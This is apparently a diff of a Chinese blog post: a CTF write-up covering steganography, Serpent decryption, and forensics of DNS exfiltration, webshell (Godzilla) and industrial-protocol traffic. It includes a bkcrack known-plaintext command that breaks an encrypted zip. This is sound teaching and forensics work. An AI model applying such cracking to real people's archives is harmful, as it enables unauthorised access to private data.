 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git -c http.proxy= -c https.proxy= clone http://ctf:ctf3000-49c4f56e-3b43-4c4f-86de-4180c95602cf.challenge.ctfplus.cn/ctf/aaa.git</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>然后需要先完成准备工作，创建一个文件，然后再push</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260422161105963.png" alt="image-20260422161105963"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260422161105963.png" alt="image-20260422161105963"></p>
 <p>虽然会报错，但是会返回flag</p>
 <h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="截取的线索"><a href="#截取的线索" class="headerlink" title="截取的线索"></a>截取的线索</h2><p>题目给了两个附件，首先看那个文件7，010打开看数据</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260418210926719.png" alt="image-20260418210926719"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260418210926719.png" alt="image-20260418210926719"></p>
 <p>RinDSA|W6dlkbXsob，通过异或</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260418211247102.png" alt="image-20260418211247102"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260418211247102.png" alt="image-20260418211247102"></p>
 <p>然后就是看图片分辨率是96x1，一共是96个像素点，每个像素点有8位储存颜色，0 &#x3D; 黑 &#x3D; 0，255 &#x3D; 白 &#x3D; 1，像素转换位二进制，</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">010111110100011101110010011001010110000101110100010111110111010001101111001100000011000101111101</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
@@ -551,10 +448,10 @@
 <h2 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign in"></a>Sign in</h2><p>题目提示是U2VjcmV0S2V5，base64解码SecretKey，然后是Serpent解密，这里要补充密钥要十六字节然后解密</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pyserpent <span class="keyword">import</span> Serpent</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    hint_b64 = <span class="string">&quot;U2VjcmV0S2V5&quot;</span></span><br><span class="line">    hint = base64.b64decode(hint_b64)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Serpent accepts 16/24/32-byte style lengths here; this challenge uses</span></span><br><span class="line">    <span class="comment"># the decoded hint padded with NUL bytes to one full 16-byte block.</span></span><br><span class="line">    key = hint.ljust(<span class="number">16</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">    ciphertext = Path(<span class="string">&quot;Serpent.dat&quot;</span>).read_bytes()</span><br><span class="line">    cipher = Serpent(key)</span><br><span class="line">    plaintext = cipher.decrypt(ciphertext)</span><br><span class="line">    flag = plaintext.rstrip(<span class="string">b&quot;\x00&quot;</span>).decode()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;hint: <span class="subst">&#123;hint!r&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;key : <span class="subst">&#123;key!r&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="/2026/04/23/UNICTF2025/image-20260418213856593.png" alt="image-20260418213856593"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260418213856593.png" alt="image-20260418213856593"></p>
 <p>UniCTF{Serpentine_Secrets}</p>
 <h2 id="Silent-Resolver"><a href="#Silent-Resolver" class="headerlink" title="Silent Resolver"></a>Silent Resolver</h2><p>大概浏览浏览一下可以看到全是dns流量，并且有可疑域名a1b2c3d4.exfil.unictf.local，过滤看一下</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260418215059300.png" alt="image-20260418215059300"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260418215059300.png" alt="image-20260418215059300"></p>
 <p>这里看到有0000-0005，在域名前面都字符串，提取出来</p>
 <p>kbfqgbauaaaaacaajbsskxfwamzbcoaaaaadmaaaaaeaaaaamzwgczzoor4hic6nzn2a44nloyy4qk4jb4utekjorf37cc4ob4wdklrsjqwy4n6pgcxiz5zvjthsrcpxgbgdddqpgzhc4mrofgxakacqjmaqefadcqaaaaaiabegkjk4wybteejyaaaaanqaaaaaqaaaaaaaaaaaaaaaaaeaaeaaaaaamzwgczzoor4hiuclaudaaaaaaaaqaaiagyaaaac6aaaaaaaa</p>
 <p>有特征位a-Z，2-7特征是base32，这个一眼base转文件，</p>
@@ -565,7 +462,7 @@
 <h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><p>璇玑科技发送Unictf2026得到flag</p>
 <p>UniCTF{He110_Uni}</p>
 <h2 id="总裁四比特-这能玩？"><a href="#总裁四比特-这能玩？" class="headerlink" title="总裁四比特,这能玩？"></a>总裁四比特,这能玩？</h2><p>随波逐流分析一波图片，formost文件提取出两个图片，尝试图片重叠，盲水印都不行。然后就没招了，还去问问三角洲的兵图片的几个人物技能，也没写出来，后来看wp，<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wyuu101/p/19542869">【2026UniCTF】总裁四比特，这能玩？ - wyuu101 - 博客园</a>知道思路</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260419233733131.png" alt="image-20260419233733131"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260419233733131.png" alt="image-20260419233733131"></p>
 <p>原始图片大小是4715004字节，提取出的liange图片是747,327字节，提取的jpg是1,725,696字节，</p>
 <p>4715004-1725696-747327x2&#x3D;747327&#x3D;747327x2</p>
 <p>这里参考大佬脚本</p>
@@ -578,23 +475,23 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">59004eb70d3a0a4a1040000d090804020080040890a0743628d650c0505657b375c0507066925bc704b00000f070607903bb</span><br><span class="line">89504e470d0a1a0a0000000d4948445200000448000004d60806000000361793e500000006624b4744000000000000f943bb</span><br></pre></td></tr></table></figure>
 
 <p>这是提取的十六进制数据，两个一组，左边的是高四位，右边的是低四位，对比两组数据，低四位相同，高四位不同，同时这个高位四组成的新的十六进制就是zip文件的文件头504b0304,就可以提取出一个zip，里面有一个嘉豪</p>
-<img src="/2026/04/23/UNICTF2025/嘉豪.png" alt="嘉豪" style="zoom:33%;">
+<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/嘉豪.png" alt="嘉豪" style="zoom:33%;">
 
 <p>随波逐流提取隐藏txt得到flag</p>
 <p>UniCTF{Y0u_4r3_4_6r347_h4ck3r_!}</p>
-<h2 id="BlueBreath"><a href="#BlueBreath" class="headerlink" title="BlueBreath"></a>BlueBreath</h2><p><img src="/2026/04/23/UNICTF2025/image-20260422172244584.png" alt="image-20260422172244584"></p>
+<h2 id="BlueBreath"><a href="#BlueBreath" class="headerlink" title="BlueBreath"></a>BlueBreath</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260422172244584.png" alt="image-20260422172244584"></p>
 <p>看post请求先上传webshell，然后进行后续操作。追流看一下</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260422172437537.png" alt="image-20260422172437537"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260422172437537.png" alt="image-20260422172437537"></p>
 <p>cookie带分号，哥斯拉流量，解密要找key，流量包还有一个压缩包，附件是是一个加密的压缩包，明文攻击破解压缩包</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C hint.zip -c hint.png -x 0 89504E470D0A1A0A0000000D</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2026/04/23/UNICTF2025/image-20260422173724704.png" alt="image-20260422173724704"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260422173724704.png" alt="image-20260422173724704"></p>
 <p>然后这个lsb隐写我是没想到这么配置</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260422175023215.png" alt="image-20260422175023215"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260422175023215.png" alt="image-20260422175023215"></p>
 <p>Ahiz_2026,解密时密钥区md5值的前16位2dc3ef5ff0c67015,但是我不理解为什么wp上用的密钥是dc3ef5ff0c670152</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260426155823710.png" alt="image-20260426155823710"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260426155823710.png" alt="image-20260426155823710"></p>
 <p>看相应包即可得到flag</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260426155917514.png" alt="image-20260426155917514"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260426155917514.png" alt="image-20260426155917514"></p>
 <h2 id="工厂应急流量分析"><a href="#工厂应急流量分析" class="headerlink" title="工厂应急流量分析"></a>工厂应急流量分析</h2><p><strong>任务 1：谁把阀门打开了？</strong></p>
 <p>这里就是用到modbus的功能码，在modbus通信里，功能码就是告诉设备要执行什么操作。modbus操作的对象有线圈，离散输出，输入寄存器，保持寄存器。</p>
 <p>线圈：相当于开关，在MODBUS中可读可写，数据只有00和01。<br>离散量：输入位，开关量，在MODBUS中只读。<br>输入寄存器：只能从模拟量输入端改变的寄存器，在MODBUS中只读。<br>保持寄存器：用于输出模拟量信号的寄存器，在MODBUS中可读可写。</p>
@@ -604,26 +501,26 @@
 <p><code>flag{0xtransaction_id_0xfunction_code_0xcoil_address}</code></p>
 <p>transaction_id就是事务id，用来匹配请求和响应的标识，function_code就是功能码，coil_address就是线圈地址</p>
 <p>过滤一下写入的的命令<code>modbus.func_code == 5</code>按照时间排序看第一个流量</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260426170236751.png" alt="image-20260426170236751"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260426170236751.png" alt="image-20260426170236751"></p>
 <p>转换为十六进制flag{0x3c4d_0x05_0x0015}</p>
 <p><strong>任务 2：被读取的 NodeId</strong></p>
 <p>4840是OPC UA协议的默认明文端口，过滤端口4840查找字符串“ns”</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260426171555335.png" alt="image-20260426171555335"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260426171555335.png" alt="image-20260426171555335"></p>
 <p>主站是192.168.1.5，从站是192.168.1.10，这里看192.168.1.5</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ReadRequest;NodeId=ns=2;s=Valve/Status;MaxAge=0</span><br></pre></td></tr></table></figure>
 
 <p>flag{ns&#x3D;2;s&#x3D;Valve&#x2F;Status}</p>
 <p><strong>任务 3：控制站域名解析结果</strong></p>
 <p>直接搜’ ctrlws.factory.local’</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260426172616940.png" alt="image-20260426172616940"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260426172616940.png" alt="image-20260426172616940"></p>
 <p>这个其请求是发往192.168.1.10，控制站ip就是192.168.1.10</p>
 <p>flag{192.168.1.10}</p>
 <p><strong>任务 4：连接建立时间</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.src==192.168.1.5&amp;&amp;ip.dst==192.168.1.10&amp;&amp;tcp</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2026/04/23/UNICTF2025/image-20260426174308993.png" alt="image-20260426174308993"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260426174308993.png" alt="image-20260426174308993"></p>
 <p>第一个包代表两个ip之间发送的tcp连接请求</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260426174507438.png" alt="image-20260426174507438"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260426174507438.png" alt="image-20260426174507438"></p>
 <p>flag{2025-03-15T09:30:01Z}</p>
 <p><strong>任务 5：HTTP 请求痕迹</strong></p>
 <p>就是上图那个流量追流</p>
@@ -634,7 +531,7 @@
 <p>有源ip有目标ip过滤一下就行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.src=192.168.1.100&amp;&amp;ip.dst=192.168.1.10</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2026/04/23/UNICTF2025/image-20260426173249096.png" alt="image-20260426173249096"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260426173249096.png" alt="image-20260426173249096"></p>
 <p>Sequence Number (BE): 291 (0x0123)</p>
 <p>flag{0x0123}</p>
 <p><strong>任务 7：SNMP Get 请求的 OID</strong></p>
@@ -642,214 +539,6 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.src == 192.168.1.5 &amp;&amp; ip.dst == 192.168.1.10 </span><br></pre></td></tr></table></figure>
 
 <p>追踪udp流</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260426174856984.png" alt="image-20260426174856984"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260426174856984.png" alt="image-20260426174856984"></p>
 <p>flag{1.3.6.1.2.1.1.5.0}</p>
-
-    </div>
-    
-    
-    
-    
-    
-      <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/" rel="tag"># 比赛复盘</a>
-          </div>
-    
-        
-
-    
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/2026/04/15/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Urldns/" rel="prev" title="java反序列化-URLDNS">
-      <i class="fa fa-chevron-left"></i> java反序列化-URLDNS
-    </a></div>
-      <div class="post-nav-item">
-    <a href="/2026/04/26/%E6%A5%9A%E6%85%A7%E6%9D%AF%E7%BA%BF%E4%B8%8B/" rel="next" title="楚慧杯线下">
-      楚慧杯线下 <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
-      </footer>
-    
-  </article>
-  
-  
-  
-
-
-
-          </div>
-          
-
-<script>
-  window.addEventListener('tabs:register', () => {
-    let { activeClass } = CONFIG.comments;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
-      }
-    }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
-    });
-  }
-</script>
-
-        </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
-
-  <aside class="sidebar">
-    <div class="sidebar-inner">
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">2.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GlyphWeaver"><span class="nav-number">2.1.</span> <span class="nav-text">GlyphWeaver</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CloudDiag"><span class="nav-number">2.2.</span> <span class="nav-text">CloudDiag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezUpload"><span class="nav-number">2.3.</span> <span class="nav-text">ezUpload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SecureDoc"><span class="nav-number">2.4.</span> <span class="nav-text">SecureDoc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E9%B8%A3%E5%94%B1%E5%90%A7"><span class="nav-number">2.5.</span> <span class="nav-text">一鸣唱吧</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezUpload-Revenge"><span class="nav-number">2.6.</span> <span class="nav-text">ezUpload Revenge!!</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Intrasight"><span class="nav-number">2.7.</span> <span class="nav-text">Intrasight</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-Java"><span class="nav-number">2.8.</span> <span class="nav-text">ez Java</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Bytecode-Compiler"><span class="nav-number">2.9.</span> <span class="nav-text">Bytecode Compiler</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gogogos"><span class="nav-number">2.10.</span> <span class="nav-text">gogogos</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">3.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%88%AA%E5%8F%96%E7%9A%84%E7%BA%BF%E7%B4%A2"><span class="nav-number">3.1.</span> <span class="nav-text">截取的线索</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Sign-in"><span class="nav-number">3.2.</span> <span class="nav-text">Sign in</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Silent-Resolver"><span class="nav-number">3.3.</span> <span class="nav-text">Silent Resolver</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Welcome"><span class="nav-number">3.4.</span> <span class="nav-text">Welcome</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E8%A3%81%E5%9B%9B%E6%AF%94%E7%89%B9-%E8%BF%99%E8%83%BD%E7%8E%A9%EF%BC%9F"><span class="nav-number">3.5.</span> <span class="nav-text">总裁四比特,这能玩？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BlueBreath"><span class="nav-number">3.6.</span> <span class="nav-text">BlueBreath</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B7%A5%E5%8E%82%E5%BA%94%E6%80%A5%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-number">3.7.</span> <span class="nav-text">工厂应急流量分析</span></a></li></ol></li></ol></div>
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">程序元</p>
-  <div class="site-description" itemprop="description">路漫漫其修远兮，吾将上下而求索。</div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">18</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-            <a href="/categories/">
-          
-        <span class="site-state-item-count">3</span>
-        <span class="site-state-item-name">分类</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-            <a href="/tags/">
-          
-        <span class="site-state-item-count">6</span>
-        <span class="site-state-item-name">标签</span></a>
-      </div>
-  </nav>
-</div>
-
-
-
-      </div>
-
-    </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
-        
-
-        
-
-<div class="copyright">
-  
-  &copy; 2025 – 
-  <span itemprop="copyrightYear">2026</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">程序元</span>
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item-icon">
-      <i class="fa fa-chart-area"></i>
-    </span>
-    <span title="站点总字数">420k</span>
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item-icon">
-      <i class="fa fa-coffee"></i>
-    </span>
-    <span title="站点阅读时长">6:22</span>
-</div>
-  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
-  </div>
-
-        
-
-
-
-
-
-
-
-
-      </div>
-    </footer>
-  </div>
-
-  
-  <script src="/lib/anime.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
-
-<script src="/js/utils.js"></script>
-
-<script src="/js/motion.js"></script>
-
-
-<script src="/js/schemes/pisces.js"></script>
-
-
-<script src="/js/next-boot.js"></script>
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
-</body>
-</html>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://cxyadvancer.github.io">Seove0n</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/">https://cxyadvancer.github.io/2026/04/23/UNICTF2025/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://cxyadvancer.github.io" target="_blank">Seove0n</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/">比赛复盘</a></div><div class="post-share"><div class="social-share" data-image="/image/2.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/04/26/%E6%A5%9A%E6%85%A7%E6%9D%AF%E7%BA%BF%E4%B8%8B/" title="楚慧杯线下"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">楚慧杯线下</div></div><div class="info-2"><div class="info-item-1">前言这周运动会还有楚慧杯线下撞到一块了，这次只能说一路坎坷，跌跌撞撞，囧事不断，还有借此机会面基了战队的一位师傅，人帅技术吊还是大一的，羡慕死了，忆往昔我大一还在陪跑。就在这篇文章记录这次武汉之旅。 赛前我们是周四出发，正好这天学校运动会开幕式，队友是学生会主席，要负责开幕式的一些工作，买的下午的票，正好上午去看看开幕式，看看各个学院的才艺，下午我们就出发了。学长临走前的嘱咐(后面要考的)  一路翻山越岭，5个小时真煎熬。到地方就去吃饭了必须推荐一波汉江路的小民大排档  超级无敌好吃。吃完饭后在等车队里的re手我土哥买了一根路边摊的淀粉肠。 比赛比赛当天早上主席说充电器没带，，，无伤大雅我们的充电器也可以用，四台电脑三个充电器也能用，到地方签完到知道就线下面基了战队的一位师傅，依旧人帅技术吊，大眼一扫怎么都是中登和老登啊吓哭了。   上午打的还可以，流量分析我直接用netA分析拿了不少分。正打类土哥就去窜，去了三四次，然后另一位师傅卷师傅打不动了，准备玩植物大战僵尸，之前做题的附件名就是植物大战僵尸杂交版.exe这个附件一运行就关机。他也没看直接运行了，然后电脑直接关机了。笑死我...</div></div></div></a><a class="pagination-related" href="/2026/04/15/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Urldns/" title="java反序列化-URLDNS"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">java反序列化-URLDNS</div></div><div class="info-2"><div class="info-item-1">前言最近在学习java反序列化的知识，先从入门链开始分析，就是这个urldns链，简单来说就是反序列时发送一次dns请求，特点是只用到了jdk自带的类，并不受版本限制，主要用在漏洞检测，查看是否存在反序列化漏洞点。接下来开始分析 原理分析具体链路就是 1HashMap.readObject()→HashMap.hash()→URL.hashCode()→URLStreamHandler.getHostAddress()→InetAddress.getByName()  接下来结合代码具体分析 12345678private int hashCode = -1; public synchronized int hashCode() &#123;      if (hashCode != -1)          return hashCode;      hashCode = handler.hashCode(this);      return hashCode;  &#125;  这里定义的hashCode为-1，就是如果hashCode如果不等于-1就返回，如果等于-1就会执...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/2.jpg" onerror="this.onerror=null;this.src='/null'" alt="avatar"/></div><div class="author-info-name">Seove0n</div><div class="author-info-description">路漫漫其修远兮，吾将上下而求索。</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/cxyadvancer"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/cxyadvancer" target="_blank" title="Seove0n"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div 